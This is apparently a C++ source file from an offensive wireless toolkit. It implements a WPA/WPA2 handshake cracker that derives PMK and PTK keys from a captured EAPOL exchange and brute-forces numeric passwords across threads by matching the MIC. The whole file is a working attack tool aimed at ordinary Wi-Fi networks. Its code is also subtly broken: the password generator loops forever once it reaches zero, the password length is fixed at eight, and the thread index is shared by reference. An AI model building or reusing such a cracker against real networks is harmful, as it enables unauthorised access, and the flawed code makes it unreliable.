//
// Created by dev on 8/4/25.
//

#include "wifi-password-cracking-task.hpp"

#include <utility>
#include <unistd.h>
ashk::tasks::WifiPasswordCrackingTask::WifiPasswordCrackingTask(pcpp::PcapLiveDevice *dev, std::string iface_name_or_ip,
                                                                std::shared_ptr<HandShakeData> handshake_data, int last_task_id) : Task(last_task_id),iface_name_or_ip(std::move(iface_name_or_ip))
                                                                ,handshake_data(std::move(handshake_data)) {

}

std::string ashk::tasks::WifiPasswordCrackingTask::get_data(ashk::tasks_data_id data_id) {
    return std::string();
}


#define SHA1_DIGEST_LENGTH 20

void prf_512(const unsigned char* key, int key_len,
             const std::string& label,
             const unsigned char* data, int data_len,
             unsigned char* output, int output_len = 64) {

    unsigned int md_len;
    unsigned char digest[SHA1_DIGEST_LENGTH];
    int iterations = (output_len + SHA1_DIGEST_LENGTH - 1) / SHA1_DIGEST_LENGTH;

    int pos = 0;
    for (int i = 0; i < iterations; ++i) {
        std::vector<unsigned char> input;
        input.insert(input.end(), label.begin(), label.end());
        input.push_back(0x00);  // null byte separator
        input.insert(input.end(), data, data + data_len);
        input.push_back(static_cast<unsigned char>(i));

        HMAC(EVP_sha1(), key, key_len, input.data(), input.size(), digest, &md_len);

        int copy_len = std::min(output_len - pos, SHA1_DIGEST_LENGTH);
        memcpy(output + pos, digest, copy_len);
        pos += copy_len;
    }
}


std::string num_to_pass(int n) {
    static const char chars[] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
    int num=10;

    std::string out;
    while(n>=0){
        out+=chars[n%num];
        n=n/num;
    }
    return out;
}

void procesThread(int start,int end,auto handshake_data,auto seed,auto epol_ofset){

    uint8_t pmk[32];
    uint8_t mic[20];
    uint8_t ptk[64];
    for(int i=start;i<end;i++) {
        std::string password= num_to_pass(i);
        std::cout<<i<<" "<<password<<std::endl;
        PKCS5_PBKDF2_HMAC_SHA1(password.c_str(), 8,
                               (uint8_t *) handshake_data->selected_ap->e_ssid.c_str(),
                               handshake_data->selected_ap->e_ssid.length(),
                               4096, 32, pmk);


        prf_512(pmk, 32, "Pairwise key expansion", seed, 6 + 6 + 32 + 32, ptk);

        memset(handshake_data->eapol + epol_ofset, 0, 16); // Zero out MIC
        HMAC(EVP_sha1(), ptk, 16, handshake_data->eapol, handshake_data->eapol_size, mic, nullptr);

        if (memcmp(mic, handshake_data->MIC, 16) == 0) {
            std::cout << "PASSWORD: " << password << std::endl;
            ashk::utils::Logger::getInstance().log("PASSWORD: "+password+"\n");
            break;
        }
    }
}
#include <fstream>
void ashk::tasks::WifiPasswordCrackingTask::exec() {
    logger.log("start password cracking\n");

    uint8_t key_descriptor_version = handshake_data->eapol[6] & 0b111;

    int mac_cmp = memcmp(handshake_data->selected_ap->b_ssid.getRawData(),
                         handshake_data->station_mac.getRawData(), 6);
    int nonce_cmp = memcmp(handshake_data->ANonce, handshake_data->SNonce, 32);

    const uint8_t *mac1 = (mac_cmp < 0)
                          ? handshake_data->selected_ap->b_ssid.getRawData()
                          : handshake_data->station_mac.getRawData();

    const uint8_t *mac2 = (mac1 == handshake_data->selected_ap->b_ssid.getRawData())
                          ? handshake_data->station_mac.getRawData()
                          : handshake_data->selected_ap->b_ssid.getRawData();

    const uint8_t *nonce1 = (nonce_cmp < 0)
                            ? handshake_data->ANonce
                            : handshake_data->SNonce;

    const uint8_t *nonce2 = (nonce1 == handshake_data->ANonce)
                            ? handshake_data->SNonce
                            : handshake_data->ANonce;
    uint8_t seed[100];
    memcpy(seed, mac1, 6);
    memcpy(seed + 6, mac2, 6);
    memcpy(seed + 12, nonce1, 32);
    memcpy(seed + 44, nonce2, 32);
    int epol_ofset = 81;
    if (handshake_data->eapol[0] == 0x01 && handshake_data->eapol[1] == 0x03 &&
        handshake_data->eapol[4] == 0x02 && handshake_data->eapol[5] == 0x01) {
        epol_ofset=81;
    }
    else if(handshake_data->eapol[0] == 0x02 && handshake_data->eapol[1] == 0x03 &&
            handshake_data->eapol[4] == 0x02 && handshake_data->eapol[5] == 0x01){
        epol_ofset=81;
    } else{
        std::cout<<"bad packet"<<std::endl;
    }
    memcpy(handshake_data->MIC,handshake_data->eapol+epol_ofset,16);

    if (handshake_data->eapol_size < epol_ofset + 16) {
        std::cerr << "ERROR: EAPOL frame too small (needs at least 97 bytes)\n";
        return;
    }
    uint8_t pmk[32];
    uint8_t mic[20];
    uint8_t ptk[64];

    std::vector<std::thread *>threads;
    int total_number_of_passwords=10000000;
    int number_of_threads= (int)sysconf(_SC_NPROCESSORS_ONLN);
    int pass_range=total_number_of_passwords/number_of_threads;
    for (int i=0;i<number_of_threads;i++){
        threads.push_back(new std::thread([&](){
            int start=i*pass_range;
            int end=(i+1)*pass_range;
            procesThread(start,end,handshake_data,seed,epol_ofset);
        }));

    }

    for (auto i:threads){
        i->join();
    }
    ashk::Task::end();
}